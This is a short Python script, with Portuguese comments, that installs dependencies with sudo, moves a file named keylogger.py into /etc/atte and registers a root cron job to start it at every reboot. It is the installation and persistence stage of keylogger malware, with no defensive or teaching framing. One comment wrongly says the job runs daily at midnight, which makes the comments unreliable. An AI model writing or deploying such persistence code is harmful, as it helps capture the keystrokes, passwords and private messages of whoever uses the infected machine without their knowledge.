import os


def dependencias():
    os.system('sudo apt-get install pip -y')
    os.system('sudo pip3 install keyboard')
    os.system('sudo pip3 install python-crontab')


def instalar():
    from crontab import CronTab
    diretorio_atual = os.getcwd()
    os.mkdir('/etc/atte')
    os.system(f'sudo mv {diretorio_atual}/keylogger.py /etc/atte')
    cron = CronTab(user=True)

# adicionar uma nova tarefa ao crontab
    job = cron.new(command='sudo /usr/bin/python3 /etc/atte/keylogger.py')
    job.setall('@reboot')  # executar todos os dias à meia-noite
    cron.write()  # salvar as mudanças no arquivo crontab


dependencias()
instalar()